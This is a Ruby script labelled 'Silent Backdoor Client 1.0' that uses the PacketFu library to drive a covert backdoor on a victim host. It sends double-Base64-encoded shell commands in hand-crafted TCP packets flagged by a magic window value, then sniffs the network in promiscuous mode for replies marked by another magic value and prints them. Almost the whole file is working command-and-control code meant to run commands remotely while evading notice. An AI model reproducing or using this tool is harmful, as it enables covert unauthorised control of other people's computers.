#!/usr/bin/env ruby

require 'rubygems'
require 'packetfu'
require 'base64'

# Local files
curdir = File.dirname(__FILE__);
require curdir + '/lib_trollop.rb'

#
#
#
@opts = Trollop::options do
    version "Silent Backdoor Client 1.0 2012(c) Karl Castillo"
    banner <<-EOS
    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    ||==     ==     ===  ||  //  ||===     ===     ===    ||==
    ||  || ||  || ||     || //   ||   || ||   || ||   ||  ||  ||
    ||==   ||==|| ||     ||<<    ||   || ||   || ||   ||  ||==
    ||  || ||  || ||     || \\\\  ||   || ||   || ||   ||  || \\\\
    ||==   ||  ||   ===  ||  \\\\  ||===     ===     ===    ||  \\\\

                             v 1.0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

2012(c) Karl Castillo

Usage:
    ruby backdoor.rb [options]

Where [options] are:
    EOS
    
    opt :host, "Victim IP Address", :short => "H", :type => :string, :default => "192.168.1.72" # string --host <s>, default 192.168.1.72
    opt :iface, "Nic Device", :short => "i", :type => :string, :default => "wlan0" # string --iface <s>, default wlan0
    opt :key, "Secret Key", :short => "k", :type => :string, :default => "secretkey" # string --key <s>, default secretkey
end

def decode(hash)
    return Base64::decode64(Base64::decode64(hash))
end

def encode(hash)
    return Base64::encode64(Base64::encode64(hash))
end

def wait_response
    cap = PacketFu::Capture.new(:iface => @opts[:iface], :start => true,
                :promisc => true)
                
    cap.stream.each do |pkt|
        if PacketFu::TCPPacket.can_parse?(pkt) then
            packet = PacketFu::Packet.parse(pkt)
            if packet.tcp_flags.psh == 1 and packet.tcp_win == 7331 then
                puts decode(packet.payload)
            end
            if packet.tcp_flags.fin == 1 and packet.tcp_flags.psh == 1 then
                return
            end
        end # can_parse? 
    end # cap
end

#
#
#
def prompt
    cfg = PacketFu::Utils.whoami?(:iface => @opts[:iface])
    
    while true do
        print "Enter Command > "
        cmd = gets.chomp
        cmds = cmd.split(' ', 1)
        
        if cmds[0] == "quit" or cmds[0] == "q" then # Quit
            abort("Quitting...")
        elsif cmds[0] == "get" then # Get File
            
        else # Generic Command
            tcp = PacketFu::TCPPacket.new
            
            tcp.eth_saddr = cfg[:eth_saddr]
            tcp.eth_daddr = cfg[:eth_daddr]
            tcp.tcp_src = rand(0xfff - 1024) + 1024
            tcp.tcp_dst = rand(0xfff - 1024) + 1024
            tcp.tcp_flags.psh = 1;
            tcp.tcp_win = 8008
            tcp.ip_saddr = cfg[:ip_saddr]
            tcp.ip_daddr = @opts[:host]
            
            tcp.payload = Base64::encode64(Base64::encode64(cmd))        
            
            tcp.recalc
            tcp.to_w(@opts[:iface])
            
            wait_response
        end
    end
end

#
#
#
begin
    raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0

    prompt_thread = Thread.new { prompt }
    prompt_thread.join
    
    rescue Interrupt
    
    Thread.kill(prompt_thread)
end
